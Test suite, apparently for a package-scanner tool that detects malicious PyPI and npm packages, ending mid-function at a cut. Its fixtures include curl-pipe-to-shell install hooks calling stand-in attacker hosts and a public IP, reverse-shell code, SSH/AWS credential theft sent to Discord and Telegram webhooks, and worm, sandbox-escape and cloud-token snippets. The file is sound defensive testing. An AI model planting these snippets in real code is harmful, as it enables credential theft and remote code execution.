import io
import tarfile
import pytest
from sentinel.core.dto import ThreatVerdict
from sentinel.assessor.python_ast import inspect_python_code_ast, analyze_python_package_tarball
from sentinel.assessor.npm_manifest import analyze_npm_package_manifest
from sentinel.assessor.npm_source import analyze_npm_package_tarball, merge_ast_reports
from sentinel.core.dto import ASTSecurityReport


def _make_tarball(files: dict) -> bytes:
    """Build an in-memory tar.gz from {archive_path: content_bytes}."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        for name, content in files.items():
            if isinstance(content, str):
                content = content.encode("utf-8")
            ti = tarfile.TarInfo(name=name)
            ti.size = len(content)
            tar.addfile(ti, io.BytesIO(content))
    return buf.getvalue()


def test_python_ast_clean_code():
    clean_code = """
from setuptools import setup, find_packages

def get_requirements():
    return ["pydantic>=2.0.0"]

setup(
    name="my-clean-package",
    version="0.1.0",
    packages=find_packages(),
    install_requires=get_requirements(),
)
"""
    report = inspect_python_code_ast(clean_code, "setup.py")
    assert report.composite_threat_score == 0
    assert report.verdict == ThreatVerdict.BENIGN_COMMUNITY
    assert report.has_socket is False
    assert report.total_lines_of_code > 0
    assert report.total_code_size_bytes > 0
    assert report.is_empty_stub is False


def test_python_ast_benign_version_exec():
    # Common packaging idiom: exec(open('version.py').read())
    code = """
from setuptools import setup, find_packages
about = {}
exec(open('google_tts/version.py').read(), about)

def get_readme():
    return open('README.md').read()

setup(
    name="google-tts",
    version=about.get('__version__', '1.0.0'),
    packages=find_packages(),
    description=get_readme(),
)
"""
    report = inspect_python_code_ast(code, "setup.py")
    assert report.composite_threat_score == 0
    assert report.verdict == ThreatVerdict.BENIGN_COMMUNITY
    assert len(report.flags) == 0
    assert report.has_os_system is False


def test_python_ast_empty_stub():
    stub_code = """
from setuptools import setup
setup(name="empty-stub-pkg", version="0.0.1")
"""
    report = inspect_python_code_ast(stub_code, "setup.py")
    assert report.composite_threat_score == 0
    assert report.verdict == ThreatVerdict.SQUATTED_STUB
    assert report.is_empty_stub is True
    assert report.code_size_tier == "EMPTY_STUB"


def test_python_ast_malicious_reverse_shell():
    malicious_code = """
import socket, subprocess, os
from setuptools import setup

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.0.0.1", 4242))
os.system("curl -s http://attacker.com/payload | sh")

setup(
    name="fastapi-azure-b2c",
    version="0.1.0",
)
"""
    report = inspect_python_code_ast(malicious_code, "setup.py")
    assert report.composite_threat_score >= 70
    assert report.verdict == ThreatVerdict.MALICIOUS
    assert report.has_socket is True
    assert report.has_os_system is True
    assert len(report.flags) >= 2


def test_python_tarball_analysis():
    # Build an in-memory tarball
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        setup_content = b'from setuptools import setup\nsetup(name="test-tarball", version="1.0.0")\n'
        ti = tarfile.TarInfo(name="test-tarball-1.0.0/setup.py")
        ti.size = len(setup_content)
        tar.addfile(ti, io.BytesIO(setup_content))

    tar_bytes = buf.getvalue()
    report = analyze_python_package_tarball(tar_bytes, "test-tarball")
    assert report.total_source_files >= 1
    assert report.total_lines_of_code >= 2
    assert report.is_empty_stub is True
    assert report.code_size_tier == "EMPTY_STUB"


def test_npm_manifest_malicious_lifecycle_script():
    manifest = {
        "name": "react-codeshift-lib",
        "dist-tags": {"latest": "1.0.0"},
        "versions": {
            "1.0.0": {
                "name": "react-codeshift-lib",
                "version": "1.0.0",
                "dist": {
                    "unpackedSize": 4096,
                    "fileCount": 3,
                },
                "scripts": {
                    "preinstall": "curl -s http://evil.com/leak | bash"
                }
            }
        }
    }
    report = analyze_npm_package_manifest(manifest, "react-codeshift-lib")
    assert report.composite_threat_score >= 70
    assert report.verdict == ThreatVerdict.MALICIOUS
    assert report.has_lifecycle_scripts is True
    assert report.total_source_files == 3
    assert report.total_code_size_bytes == 4096


def test_python_ast_cmdclass_install_override():
    malicious_cmdclass = """
import os
from setuptools import setup
from setuptools.command.install import install

class CustomInstall(install):
    def run(self):
        os.system("curl -s https://evil.com/setup_payload.sh | bash")
        install.run(self)

setup(
    name="openai-connector-utils",
    version="1.0.0",
    cmdclass={"install": CustomInstall},
)
"""
    report = inspect_python_code_ast(malicious_cmdclass, "setup.py")
    assert report.composite_threat_score >= 45
    assert any("INSTALL_TIME_CMDCLASS_OVERRIDE" in f for f in report.flags)
    assert report.has_os_system is True


def test_python_ast_dynamic_obfuscated_access():
    obfuscated_code = """
import os
from setuptools import setup

getattr(__builtins__, 'ev' + 'al')('os.system("whoami")')

setup(
    name="anthropic-eval-helper",
    version="0.1.0",
)
"""
    report = inspect_python_code_ast(obfuscated_code, "setup.py")
    assert any("OBFUSCATED_DYNAMIC_ACCESS" in f for f in report.flags)
    assert report.composite_threat_score >= 25


# ==================== npm tarball source scanner ====================

def test_npm_source_clean_code_no_flags():
    tar_bytes = _make_tarball({
        "package/index.js": "function add(a, b) { return a + b; }\nmodule.exports = { add };\n",
        "package/lib/util.js": "exports.noop = function() {};\n",
    })
    report = analyze_npm_package_tarball(tar_bytes, "clean-lib")
    assert report.flags == []
    assert report.composite_threat_score == 0
    assert report.total_source_files == 2


def test_npm_source_benign_eval_alone_is_informational_not_critical():
    # eval() alone (no decode/network in the same file) should be flagged for
    # visibility but must NOT reach the MALICIOUS-gating combined signal.
    tar_bytes = _make_tarball({
        "package/index.js": "const result = eval(userExpression);\n",
    })
    report = analyze_npm_package_tarball(tar_bytes, "eval-user-expr")
    assert any(f.startswith("SOURCE_CODE_DYNAMIC_EXECUTION") for f in report.flags)
    assert not any(f.startswith("SOURCE_CODE_DYNAMIC_CODE_LOADER") for f in report.flags)
    assert report.verdict != ThreatVerdict.MALICIOUS


def test_npm_source_download_and_eval_is_confirmed_dangerous():
    # The textbook "fetch payload, then execute it" shape.
    tar_bytes = _make_tarball({
        "package/postinstall.js": (
            "const axios = require('axios');\n"
            "axios.get('http://evil.example/payload').then(r => eval(r.data));\n"
        ),
    })
    report = analyze_npm_package_tarball(tar_bytes, "fetch-and-eval")
    assert any(f.startswith("SOURCE_CODE_DYNAMIC_CODE_LOADER") for f in report.flags)
    assert report.composite_threat_score >= 70
    assert report.verdict == ThreatVerdict.MALICIOUS


def test_npm_source_unrelated_eval_and_fetch_far_apart_is_not_a_loader():
    """
    Regression test: a real production rollout of the source scanner produced 10
    false MALICIOUS verdicts on packages vendoring large third-party libraries
    (jQuery, Angular, D3, web3.js) where eval()/new Function() and fetch()/XHR
    both appear somewhere in a multi-thousand-line bundle with no relationship to
    each other. The loader signal must require textual proximity, not just
    "both patterns exist somewhere in this file".
    """
    far_apart_content = "const template = eval(compiledExpr);\n" + ("// padding line\n" * 200) + "fetch(apiUrl).then(r => r.json());\n"
    tar_bytes = _make_tarball({"package/dist/vendor.bundle.js": far_apart_content})
    report = analyze_npm_package_tarball(tar_bytes, "vendors-a-real-library")
    assert not any(f.startswith("SOURCE_CODE_DYNAMIC_CODE_LOADER") for f in report.flags)
    assert report.verdict != ThreatVerdict.MALICIOUS


def test_npm_source_deduplicates_repeated_pattern_across_files():
    """
    A package vendoring the same bundled library under multiple paths (dist/ +
    src/ + a minified copy — common in real packages) must not have its score
    inflated by restating the identical evidence once per copy.
    """
    tar_bytes = _make_tarball({
        "package/dist/lib.js": "const x = eval(a);\n",
        "package/src/lib.js": "const x = eval(a);\n",
        "package/dist/lib.min.js": "const x=eval(a);\n",
    })
    report = analyze_npm_package_tarball(tar_bytes, "vendored-thrice")
    exec_flags = [f for f in report.flags if f.startswith("SOURCE_CODE_DYNAMIC_EXECUTION")]
    assert len(exec_flags) == 1
    assert "more occurrence(s) elsewhere" in exec_flags[0]


def test_npm_source_base64_decode_and_execute_is_confirmed_dangerous():
    tar_bytes = _make_tarball({
        "package/index.js": (
            "const payload = Buffer.from(process.env.X, 'base64').toString();\n"
            "new Function(payload)();\n"
        ),
    })
    report = analyze_npm_package_tarball(tar_bytes, "decode-and-run")
    assert any(f.startswith("SOURCE_CODE_DYNAMIC_CODE_LOADER") for f in report.flags)
    assert report.verdict == ThreatVerdict.MALICIOUS


def test_npm_source_skips_node_modules_and_test_dirs():
    tar_bytes = _make_tarball({
        "package/node_modules/dep/index.js": "eval('should not be scanned');\n",
        "package/test/fixture.js": "eval('should not be scanned either');\n",
        "package/index.js": "module.exports = {};\n",
    })
    report = analyze_npm_package_tarball(tar_bytes, "has-vendored-deps")
    assert report.flags == []


def test_merge_ast_reports_prefers_source_metrics_and_worst_verdict():
    manifest_report = ASTSecurityReport(
        has_lifecycle_scripts=True,
        total_source_files=1,
        total_lines_of_code=15,  # crude unpackedSize-based estimate
        total_code_size_bytes=600,
        flags=["LIFECYCLE_SCRIPT: 'postinstall' -> 'node setup.js'"],
        composite_threat_score=25,
        verdict=ThreatVerdict.SUSPICIOUS,
    )
    source_report = ASTSecurityReport(
        total_source_files=3,
        total_lines_of_code=120,  # real count from actual file content
        total_code_size_bytes=4000,
        flags=["SOURCE_CODE_DYNAMIC_CODE_LOADER: execution primitive combined with decode/network call in setup.js"],
        composite_threat_score=45,
        verdict=ThreatVerdict.MALICIOUS,
    )
    merged = merge_ast_reports(manifest_report, source_report)
    assert merged.total_source_files == 3
    assert merged.total_lines_of_code == 120
    assert merged.verdict == ThreatVerdict.MALICIOUS  # worse of the two
    assert merged.composite_threat_score == 70  # summed, capped at 100
    assert len(merged.flags) == 2  # union of both


# ==================== pyproject.toml build-backend inspection ====================

def test_pyproject_known_safe_backend_not_flagged():
    tar_bytes = _make_tarball({
        "pkg-1.0.0/setup.py": 'from setuptools import setup\nsetup(name="pkg", version="1.0.0")\n',
        "pkg-1.0.0/pyproject.toml": '[build-system]\nrequires = ["setuptools"]\nbuild-backend = "setuptools.build_meta"\n',
    })
    report = analyze_python_package_tarball(tar_bytes, "pkg")
    assert not any("CUSTOM_BUILD_BACKEND" in f for f in report.flags)


def test_pyproject_unverified_backend_is_flagged():
    tar_bytes = _make_tarball({
        "pkg-1.0.0/pyproject.toml": '[build-system]\nrequires = ["_pkg_build"]\nbuild-backend = "_pkg_build"\n',
        "pkg-1.0.0/_pkg_build.py": "def build_wheel(*a, **kw):\n    pass\n",
    })
    report = analyze_python_package_tarball(tar_bytes, "pkg")
    assert any("CUSTOM_BUILD_BACKEND_UNVERIFIED" in f for f in report.flags)


def test_pyproject_malicious_custom_backend_is_detected():
    # A build backend module that runs a dangerous call at top level (i.e. as soon
    # as it's imported to run build_wheel/build_sdist) — previously invisible,
    # since only setup.py/__init__.py/first-5-files ever got AST-inspected and a
    # custom-build-backend package need not have either.
    tar_bytes = _make_tarball({
        "pkg-1.0.0/pyproject.toml": '[build-system]\nrequires = ["_pkg_build"]\nbuild-backend = "_pkg_build"\n',
        "pkg-1.0.0/_pkg_build.py": "import os\nos.system('curl evil.example/x.sh | sh')\n\ndef build_wheel(*a, **kw):\n    pass\n",
        "pkg-1.0.0/mod1.py": "x = 1\n",
        "pkg-1.0.0/mod2.py": "x = 2\n",
        "pkg-1.0.0/mod3.py": "x = 3\n",
        "pkg-1.0.0/mod4.py": "x = 4\n",
        "pkg-1.0.0/mod5.py": "x = 5\n",
        "pkg-1.0.0/mod6.py": "x = 6\n",  # pushes total_source_files > 5 so only setup.py/__init__.py/backend get scanned
    })
    report = analyze_python_package_tarball(tar_bytes, "pkg")
    # The key assertion: a dangerous top-level call inside a custom build-backend
    # module is now detected at all — previously impossible, since only
    # setup.py/__init__.py/first-5-files were ever AST-inspected.
    assert any("INSTALL_TIME_EXECUTION" in f for f in report.flags)
    assert report.composite_threat_score >= 35
    assert report.verdict in (ThreatVerdict.SUSPICIOUS, ThreatVerdict.MALICIOUS)


def test_npm_source_detects_env_vars_access():
    tar_bytes = _make_tarball({
        "package/index.js": "const token = process.env.GITHUB_TOKEN || process['env']['NPM_TOKEN'];\n",
    })
    report = analyze_npm_package_tarball(tar_bytes, "env-harvester")
    assert any("SOURCE_CODE_ENV_VARS_ACCESS" in f for f in report.flags)


def test_python_ast_detects_env_vars_access():
    code = (
        "from setuptools import setup\n"
        "import os\n"
        "secret = os.environ.get('SECRET_KEY') or os.getenv('API_TOKEN')\n"
        "setup(name='stealer', version='1.0.0')\n"
    )
    report = inspect_python_code_ast(code, "setup.py")
    assert any("SOURCE_CODE_ENV_VARS_ACCESS" in f for f in report.flags)
    assert report.composite_threat_score >= 15


def _make_wheel(files: dict) -> bytes:
    import zipfile
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, mode="w") as z:
        for name, content in files.items():
            if isinstance(content, str):
                content = content.encode("utf-8")
            z.writestr(name, content)
    return buf.getvalue()


def test_python_pth_startup_code_execution_detected():
    """
    Test Python .pth file execution trap in wheels (used by Hades and LiteLLM campaigns).
    Any line starting with 'import ' in a .pth executes immediately on interpreter startup.
    """
    wheel_bytes = _make_wheel({
        "backdoor.pth": "import os, subprocess; subprocess.Popen(['curl', 'http://185.220.101.5/stage2']) # startup hook\n",
        "fakepkg/__init__.py": "__version__ = '1.0.0'\n",
    })
    report = analyze_python_package_tarball(wheel_bytes, "fakepkg")
    assert any("PYTHON_PTH_CODE_EXECUTION" in f for f in report.flags)
    assert report.has_pth_execution is True
    assert report.verdict == ThreatVerdict.MALICIOUS


def test_python_pth_benign_startup_hook_flagged_informational():
    wheel_bytes = _make_wheel({
        "loader.pth": "import my_custom_loader\n",
        "my_custom_loader.py": "x = 1\n",
    })
    report = analyze_python_package_tarball(wheel_bytes, "loaderpkg")
    assert any("PYTHON_PTH_STARTUP_HOOK" in f for f in report.flags)
    assert not any("PYTHON_PTH_CODE_EXECUTION" in f for f in report.flags)
    assert report.has_pth_execution is False


def test_python_ast_exfiltration_discord_webhook_detected():
    code = """
from setuptools import setup
import urllib.request
HOOK = "https://discord.com/api/webhooks/1234567890/token_ABC_XYZ_123"
setup(name="pkg", version="1.0.0")
"""
    report = inspect_python_code_ast(code, "setup.py")
    assert any("EXFILTRATION_DESTINATION_DETECTED" in f for f in report.flags)
    assert report.has_exfiltration_destination is True
    assert report.composite_threat_score >= 45


def test_python_ast_credential_path_harvesting_detected():
    code = """
from setuptools import setup
import os
path = os.path.expanduser("~/.aws/credentials")
with open(path) as f:
    key = f.read()
setup(name="aws-pkg", version="1.0.0")
"""
    report = inspect_python_code_ast(code, "setup.py")
    assert any("CREDENTIAL_PATH_HARVESTING" in f for f in report.flags)
    assert report.has_credential_harvesting is True
    assert report.composite_threat_score >= 40


def test_python_ast_constant_folding_deobfuscation():
    """
    Ensure string binary concatenation (e.g. 'sys' + 'tem') is folded so
    obfuscated getattr dynamic calls are caught reliably.
    """
    code = """
from setuptools import setup
getattr(__builtins__, 'sys' + 'tem')('id')
setup(name="folded-stealer", version="1.0.0")
"""
    report = inspect_python_code_ast(code, "setup.py")
    assert any("resolving 'system'" in f for f in report.flags)
    assert report.has_os_system is True
    assert report.composite_threat_score >= 40


def test_package_with_bundled_native_binary_detected():
    tar_bytes = _make_tarball({
        "mypkg/__init__.py": "pass\n",
        "mypkg/backdoor.so": b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00",
    })
    report = analyze_python_package_tarball(tar_bytes, "mypkg")
    assert any("BUNDLED_NATIVE_BINARY" in f for f in report.flags)
    assert report.has_bundled_binary is True


def test_npm_source_discord_webhook_and_env_vars_is_confirmed_stealer():
    tar_bytes = _make_tarball({
        "package/index.js": (
            "const hook = 'https://discordapp.com/api/webhooks/999999/SECRET_WEBHOOK_URL';\n"
            "const token = process.env.NPM_TOKEN;\n"
            "fetch(hook, {method: 'POST', body: JSON.stringify({token})});\n"
        ),
    })
    report = analyze_npm_package_tarball(tar_bytes, "npm-discord-stealer")
    assert any(f.startswith("SOURCE_CODE_CONFIRMED_STEALER") for f in report.flags)
    assert any(f.startswith("EXFILTRATION_DESTINATION_DETECTED") for f in report.flags)
    assert report.verdict == ThreatVerdict.MALICIOUS
    assert report.composite_threat_score >= 70


def test_npm_source_credential_path_harvesting_detected():
    tar_bytes = _make_tarball({
        "package/harvest.js": "const fs = require('fs'); const data = fs.readFileSync('~/.ssh/id_rsa');\n",
    })
    report = analyze_npm_package_tarball(tar_bytes, "ssh-harvester")
    assert any(f.startswith("CREDENTIAL_PATH_HARVESTING") for f in report.flags)
    assert report.has_credential_harvesting is True


def test_npm_source_weaponized_binding_gyp_python_escape_detected():
    """
    Test Shai-Hulud / TeamPCP binding.gyp vector.
    npm packages without preinstall/postinstall can trigger code execution via
    node-gyp compiling a binding.gyp with Python sandbox escape hooks.
    """
    tar_bytes = _make_tarball({
        "package/binding.gyp": """
        {
            "conditions": [
                ["[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('node 3FWCvzduYZg.js') == 0x00", {}]
            ]
        }
        """,
        "package/index.js": "module.exports = {};\n",
    })
    report = analyze_npm_package_tarball(tar_bytes, "gyp-weaponized-pkg")
    assert any(f.startswith("GYP_WEAPONIZED_EXECUTION") for f in report.flags)
    assert report.verdict == ThreatVerdict.MALICIOUS
    assert report.composite_threat_score >= 85


def test_npm_source_cross_ecosystem_shai_hulud_worm_detected():
    """
    Test Shai-Hulud cross-ecosystem worm replication engine (token validation
    against PyPI upload endpoint).
    """
    tar_bytes = _make_tarball({
        "package/worm.js": """
        async function handlePypiTokens(tokens) {
            for (const t of tokens) {
                await fetch('https://upload.pypi.org/legacy/', {
                    method: 'POST',
                    headers: {'Authorization': 'Basic ' + Buffer.from('__token__:' + t).toString('base64')}
                });
            }
        }
        """,
    })
    report = analyze_npm_package_tarball(tar_bytes, "cross-worm-pkg")
    assert any(f.startswith("CROSS_ECOSYSTEM_WORM_PROPAGATION") for f in report.flags)
    assert report.verdict == ThreatVerdict.MALICIOUS
    assert report.composite_threat_score >= 85


def test_npm_source_imds_and_kube_token_harvesting_detected():
    tar_bytes = _make_tarball({
        "package/cloud_steal.js": """
        const imds = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/';
        const kube = '/var/run/secrets/kubernetes.io/serviceaccount/token';
        """,
    })
    report = analyze_npm_package_tarball(tar_bytes, "cloud-stealer")
    assert any("Cloud Instance Metadata" in f for f in report.flags)
    assert any("Kubernetes Service Account Token" in f for f in report.flags)


def test_npm_source_skips_test_files_and_fixtures():
    """
    Test files (e.g. execute.remote.test.js) and fixture directories should be
    completely excluded from runtime malware / stealer inspection.
    """
    tar_bytes = _make_tarball({
        "package/dist/server/execute.remote.test.js": """
        describe('remoteExecution', () => {
            it('connects to fixture server', () => {
                const stacyApiUrl = 'http://198.51.100.10:3102';
                const token = process.env.STACY_TEST_TOKEN;
                expect(stacyApiUrl).toBeDefined();
            });
        });
        """,
        "package/dist/server/index.js": "module.exports = { run: () => 'ok' };\n",
    })
    report = analyze_npm_package_tarball(tar_bytes, "adapter-with-tests")
    assert not any("EXFILTRATION_DESTINATION_DETECTED" in f for f in report.flags)
    assert not any("SOURCE_CODE_CONFIRMED_STEALER" in f for f in report.flags)
    assert report.verdict == ThreatVerdict.BENIGN_COMMUNITY


def test_npm_source_ignores_rfc5737_and_loopback_ips():
    """
    RFC 5737 documentation/test nets (198.51.100.x, 192.0.2.x, 203.0.113.x) and
    loopback/private IPs must not be flagged as public exfiltration endpoints.
    """
    tar_bytes = _make_tarball({
        "package/server.js": """
        const testNet1 = 'http://192.0.2.1:8080';
        const testNet2 = 'http://198.51.100.10:3102';
        const testNet3 = 'http://203.0.113.5';
        const local = 'http://127.0.0.1:3000';
        const privateIp = 'http://10.0.0.5:9000';
        """,
    })
    report = analyze_npm_package_tarball(tar_bytes, "doc-net-pkg")
    assert not any("EXFILTRATION_DESTINATION_DETECTED" in f for f in report.flags)


def test_npm_source_flags_real_public_ip_exfil():
    """Routable public IPs in runtime source must be flagged."""
    tar_bytes = _make_tarball({
        "package/c2.js": "const c2 = 'http://185.220.101.5:4444/beacon';\n",
    })
    report = analyze_npm_package_tarball(tar_bytes, "real-ip-c2")
    assert any("Raw Public IP Endpoint" in f for f in report.flags)
    assert report.has_exfiltration_destination is True


def test_npm_source_module_imports_not_dynamic_code_loader():
    """
    Co-located import statements (require('http') + require('child_process'))
    in a module header must NOT be misclassified as a dynamic code loader.
    """
    tar_bytes = _make_tarball({
        "package/cli.js": """
        const http = require('http');
        const { execSync } = require('child_process');
        module.exports = { http, execSync };
        """,
    })
    report = analyze_npm_package_tarball(tar_bytes, "benign-cli")
    assert not any("SOURCE_CODE_DYNAMIC_CODE_LOADER" in f for f in report.flags)


def test_npm_source_stealer_requires_sensitive_token_or_creds():
    """
    Generic process.env.NODE_ENV or process.env.PORT must not trigger stealer,
    but sensitive token harvesting (e.g. AWS_SECRET_ACCESS_KEY) with exfiltration does.
    """
    # 1. Benign process.env + webhook (e.g. build notification)
    benign_tar = _make_tarball({
        "package/notify.js": """
        const webhook = 'https://discord.com/api/webhooks/123/abc';
        if (process.env.NODE_ENV === 'production') {
            console.log('Sending alert...');
        }
        """,
    })
    benign_report = analyze_npm_package_tarball(benign_tar, "benign-notify")
    assert not any("SOURCE_CODE_CONFIRMED_STEALER" in f for f in benign_report.flags)

    # 2. Malicious sensitive token harvesting + webhook
    malicious_tar = _make_tarball({
        "package/steal.js": """
        const hook = 'https://discord.com/api/webhooks/123/abc';
        const secret = process.env.AWS_SECRET_ACCESS_KEY;
        fetch(hook, { method: 'POST', body: secret });
        """,
    })
    malicious_report = analyze_npm_package_tarball(malicious_tar, "malicious-stealer")
    assert any("SOURCE_CODE_CONFIRMED_STEALER" in f for f in malicious_report.flags)


def test_python_ast_uv_build_backend_is_safe():
    """Astral uv_build declared in pyproject.toml must be recognized as known safe."""
    from sentinel.assessor.python_ast import analyze_python_package_tarball

    pyproject_text = """
    [build-system]
    requires = ["uv_build"]
    build-backend = "uv_build"
    """
    tar_bytes = _make_tarball({
        "pkg-0.1.0/pyproject.toml": pyproject_text,
        "pkg-0.1.0/src/pkg/__init__.py": "# clean package\n",
    })
    report = analyze_python_package_tarball(tar_bytes, "pkg")
    assert not any("CUSTOM_BUILD_BACKEND_UNVERIFIED" in f for f in report.flags)


def test_python_wheel_cpython_extension_not_flagged_as_unexpected_binary():
    """Standard CPython extension modules in wheels must not be flagged as unexpected native binaries."""
    import zipfile
    import io
    from sentinel.assessor.python_ast import analyze_python_package_tarball

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("my_pkg/__init__.py", "print('hello')\n")
        z.writestr("my_pkg/_speedups.cpython-311-x86_64-linux-gnu.so", b"\x7fELFfake_cpython_so")
    whl_bytes = buf.getvalue()

    report = analyze_python_package_tarball(whl_bytes, "my-pkg")
    assert not any("BUNDLED_NATIVE_BINARY" in f for f in report.flags)


def test_assessor_detects_expanded_imds_mcp_and_runtime_droppers():
    """Verify detection of GCP/AWS IMDS endpoints, MCP/AI agent config hijacking, and secondary runtime droppers."""
    from sentinel.assessor.python_ast import analyze_python_package_tarball
    from sentinel.assessor.npm_source import analyze_npm_package_tarball

    py_payload = '''
def install_hook():
    import urllib.request
    imds = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
    mcp = ".cursorrules"
    dropper = "https://github.com/oven-sh/bun/releases/download/bun-v1.1.20/bun-linux-x64.zip"
    urllib.request.urlopen(dropper)
'''
    tar_bytes = _make_tarball({
        'testpkg-0.1.0/setup.py': 'from setuptools import setup\nsetup(name="testpkg")\n',
        'testpkg-0.1.0/testpkg.py': py_payload,
    })
    report = analyze_python_package_tarball(tar_bytes, 'testpkg')
    assert any('Cloud Instance Metadata' in f for f in report.flags)
    assert any('IDE / AI Agent Configuration Hijacking' in f for f in report.flags)
    assert any('CROSS_ECOSYSTEM_WORM_PROPAGATION' in f for f in report.flags)

    npm_payload = '''
const dropper = 'https://github.com/denoland/deno/releases/download/v1.45.0/deno.zip';
const mcp = 'scripts/setup-chrome-mcp.mjs';
const imds = 'http://169.254.169.254/metadata/identity/oauth2/token';
'''
    npm_tar = _make_tarball({
        'package/package.json': '{"name": "test-npm", "version": "1.0.0"}',
        'package/index.js': npm_payload,
    })
    npm_report = analyze_npm_package_tarball(npm_tar, 'test-npm')
    assert any('Cloud Instance Metadata' in f for f in npm_report.flags)
    assert any('IDE / AI Agent Configuration Hijacking' in f for f in npm_report.flags)
    assert any('CROSS_ECOSYSTEM_WORM_PROPAGATION' in f for f in npm_report.flags)


def test_assessor_skips_decompression_bomb_files(monkeypatch):
    """Verify that files exceeding MAX_BYTES_PER_FILE are skipped without reading/parsing."""
    import sentinel.assessor.python_ast as py_ast_mod
    monkeypatch.setattr(py_ast_mod, "MAX_BYTES_PER_FILE", 500)

    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        ti = tarfile.TarInfo(name="pkg-0.1.0/huge_exploit.py")
        content = b"# " + b"x" * 1000
        ti.size = len(content)
        tar.addfile(ti, io.BytesIO(content))

        setup_content = b"from setuptools import setup\nsetup(name='pkg')\n"
        ti2 = tarfile.TarInfo(name="pkg-0.1.0/setup.py")
        ti2.size = len(setup_content)
        tar.addfile(ti2, io.BytesIO(setup_content))

    report = py_ast_mod.analyze_python_package_tarball(buf.getvalue(), "pkg")
    assert report.composite_threat_score == 0
    assert report.total_source_files == 2
    # huge_exploit.py (1000 bytes) was skipped, so only setup.py bytes are counted
    assert report.total_code_size_bytes < 100


def test_python_ast_confirmed_stealer_webhook_and_aws_keys():
    """Exfiltration destination combined with AWS credential harvesting in Python must trigger CONFIRMED_STEALER."""
    code = """
from setuptools import setup
import os, urllib.request

def steal():
    webhook = "https://discord.com/api/webhooks/9876543210/token123"
    aws_creds = os.path.expanduser("~/.aws/credentials")
    with open(aws_creds) as f:
        data = f.read()
    urllib.request.urlopen(webhook, data=data.encode())

setup(name="stealer-pkg", version="1.0.0")
"""
    report = inspect_python_code_ast(code, "setup.py")
    assert any("EXFILTRATION_DESTINATION_DETECTED" in f for f in report.flags)
    assert any("CREDENTIAL_PATH_HARVESTING" in f for f in report.flags)
    assert any(f.startswith("SOURCE_CODE_CONFIRMED_STEALER") for f in report.flags)
    assert report.has_exfiltration_destination is True
    assert report.has_credential_harvesting is True
    assert report.verdict == ThreatVerdict.MALICIOUS
    assert report.composite_threat_score >= 70


def test_python_ast_confirmed_stealer_webhook_and_sensitive_env():
    """Exfiltration destination combined with sensitive environment variable access in Python."""
    code = """
from setuptools import setup
import os, urllib.request

webhook = "https://api.telegram.org/bot123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11"
api_key = os.environ.get("AWS_SECRET_ACCESS_KEY") or os.environ.get("NPM_TOKEN")
setup(name="env-stealer", version="0.1.0")
"""
    report = inspect_python_code_ast(code, "setup.py")
    assert any("EXFILTRATION_DESTINATION_DETECTED" in f for f in report.flags)
    assert any("SOURCE_CODE_ENV_VARS_ACCESS" in f for f in report.flags)
    assert any(f.startswith("SOURCE_CODE_CONFIRMED_STEALER") for f in report.flags)
    assert report.verdict == ThreatVerdict.MALICIOUS


def test_python_ast_telegram_and_oast_exfil_detected():
    """Telegram bot API endpoints and OAST callback service domains."""
    code = """
import urllib.request
bot = "https://api.telegram.org/bot987654:XYZ-1234"
oast = "https://subdomain.oastify.com/collector"
interact = "http://mytest.interact.sh/ping"
"""
    report = inspect_python_code_ast(code, "module.py")
    assert any("Telegram Bot API" in f for f in report.flags)
    assert any("OAST" in f for f in report.flags)
    assert report.has_exfiltration_destination is True


def test_python_ast_reverse_tunneling_detected():
    """Reverse tunneling endpoints in Python modules."""
    code = """
c2_tunnel = "https://attacker.ngrok-free.app/cmd"
c2_cf = "https://random-sub.trycloudflare.com/tunnel"
"""
    report = inspect_python_code_ast(code, "tunnel.py")
    assert any("Tunneling Service" in f for f in report.flags)
    assert report.has_exfiltration_destination is True


def test_python_ast_shai_hulud_and_dropper_worm_detected():
    """PyPI upload endpoint probing and secondary portable runtime droppers."""
    code = """
pypi_endpoint = "https://upload.pypi.org/legacy/"
bun_dropper = "https://github.com/oven-sh/bun/releases/download/v1.1.0/bun-linux-x64.zip"
"""
    report = inspect_python_code_ast(code, "worm.py")
    assert any("CROSS_ECOSYSTEM_WORM_PROPAGATION" in f for f in report.flags)
    assert report.composite_threat_score >= 45



def test_python_ast_public_ip_vs_rfc5737_filtering():
    """Public routable IP endpoints are detected; documentation / loopback IPs are not."""
    # 1. Benign IP (RFC 5737 / loopback / private)
    benign_code = """
test_ip = "http://198.51.100.25:8080/test"
local_ip = "http://127.0.0.1:5000"
priv_ip = "http://10.0.0.1:3000"
"""
    benign_report = inspect_python_code_ast(benign_code, "config.py")
    assert not any("EXFILTRATION_DESTINATION_DETECTED" in f for f in benign_report.flags)

    # 2. Public routable IP
    malicious_code = """
c2_ip = "http://185.220.101.5:4444/beacon"
"""
    mal_report = inspect_python_code_ast(malicious_code, "connect.py")
    assert any("Raw Public IP Endpoint" in f for f in mal_report.flags)
    assert mal_report.has_exfiltration_destination is True


def test_python_ast_tls_verification_bypass_detected():
    """Defense evasion via SSL/TLS verification bypass."""
    code = """
import ssl, urllib.request
ctx = ssl._create_unverified_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
"""
    report = inspect_python_code_ast(code, "insecure.py")
    assert any("TLS / SSL Verification Bypass" in f for f in report.flags)


def test_python_ast_composite_threat_elevation_on_install_time():
    """Install-time execution (top-level os.system or cmdclass) elevates threat score over plain functions."""
    top_level_code = """
import os
os.system("curl -s http://185.220.101.5/p | sh")
"""
    report_top = inspect_python_code_ast(top_level_code, "setup.py")
    assert any("INSTALL_TIME_EXECUTION" in f for f in report_top.flags)
    assert report_top.composite_threat_score >= 70
    assert report_top.verdict == ThreatVerdict.MALICIOUS


def test_python_tarball_nested_setup_py_in_vendored_dir_ignored():
